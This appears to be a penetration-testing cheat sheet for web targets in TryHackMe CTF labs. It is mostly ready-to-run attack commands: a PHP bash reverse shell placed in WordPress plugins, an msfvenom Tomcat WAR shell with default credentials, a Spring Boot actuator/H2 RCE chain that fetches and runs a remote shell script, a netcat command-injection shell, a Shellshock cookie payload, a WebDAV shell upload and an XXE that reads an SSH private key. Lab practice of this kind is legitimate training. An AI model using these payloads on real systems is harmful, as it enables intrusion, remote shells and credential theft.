# Web

## Wordpress

### Reverse Shell #1 - Edit existing Plugin

**Examples**&#x20;

[#initial-shell](../../walkthroughs/tryhackme/wordpress-cve-2021-29447.md#initial-shell "mention")

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

Update the page with your reverse shell then save. This will make the plugin not appear anymore under Installed Plugins

<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>

Curl the page to activate it.

**Kali**

```
curl http://$VICTIM/wp-content/plugins/akismet/akismet.php
```

### Reverse Shell  #2 - Upload Plugin

**Examples**&#x20;

[mr-robot-ctf.md](../../walkthroughs/tryhackme/mr-robot-ctf.md "mention")[retro.md](../../walkthroughs/tryhackme/retro.md "mention")

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```

**Kali**

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

## TomCat

### Common usernames and passwords

**Examples**

[thompson.md](../../walkthroughs/tryhackme/thompson.md "mention")

```
tomcat
s3cret
```

### Reverse Shell

**Examples**

[thompson.md](../../walkthroughs/tryhackme/thompson.md "mention")

**Kali**

<pre><code><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=1337 -f war > rshell.war
</strong>nc -lvnp 1337
</code></pre>

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>



## Spring Boot&#x20;

### Reverse Shell

**Examples**

[#initial-shell](../../walkthroughs/tryhackme/spring.md#initial-shell "mention")

**Exploit:** [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)

**Kali #1**

```
tcpdump -i ens5 icmp
```

Below example checks the IP which may not be necessary.&#x20;

**Kali #2**

<pre><code>curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 $KALI\');\"}' "https://$VICTIM/actuator/env" -k
<strong>
</strong>curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
</code></pre>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**reverse.sh**

```
bash -c "bash -i >& /dev/tcp/$KALI/1337 0>&1"
```

**Kali #1**

```
python3 -m http.server 81
```

**Kali #2**

```
nc -lvnp 1337
```

Download payload

**Kali #3**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://$KALI:81/reverse.sh -O /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
```

Run payload

**Kali #3**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## See CMDS from page source

**Examples**

[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")

Sometimes you can't see the results of the output from the page so you need to check the page source.

```
view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=whoami
```

<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

**Browser**

```
view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
```



## CGI-Bin

### Scanning

**Examples**

[0day.md](../../walkthroughs/tryhackme/0day.md "mention")

See if a cgi-bin folder appears in the inital scans, if it does start scanning that direcoty for .cgi files.

**Kali**

```
gobuster dir -u http://$VICTIM/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,cgi
```

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

### Shell

**Examples**

[0day.md](../../walkthroughs/tryhackme/0day.md "mention")

**Link:** [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

**Kali#1**

```
nc -lvnp 4242
```

**Kali #2**

```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/$KALI/4242 0>&1' http://$VICTIM/cgi-bin/test.cgi 
```

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>



## Change request type

**Examples**

[mothers-secret.md](../../walkthroughs/tryhackme/mothers-secret.md "mention")

<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

Change the request to POST and add everything else highlighted, we see the status message now changes.

<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>



Now we change the yaml to the the emergency override code mentioned in the room.

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

Now we perform the same steps again except this time for the api/nostromo route and the new file we discovered.

<figure><img src="../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

## **WebDav Cadvaer**&#x20;

If server is using WebDav and we have credentials we can login and upload files.

**Examples**

[dav.md](../../walkthroughs/tryhackme/dav.md "mention")

**Kali**

<pre><code><strong>cadaver http://$VICTIM:80/webdav
</strong>Username: wampp
Password: xampp
dav:/webdav/> put shell.php shell.php
</code></pre>



## XML-RPC

### Check if it is enabled

**Examples**

[retro.md](../../walkthroughs/tryhackme/retro.md "mention")

wpscan or a scan maybe able identified that xmlrpc.php exists, if it is check if it is enabled.

```
POST /$SITE/xmlrpc.php HTTP/1.1
Host: $VICTIM
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>

### View Files

**Examples**

[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")

**Input**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```





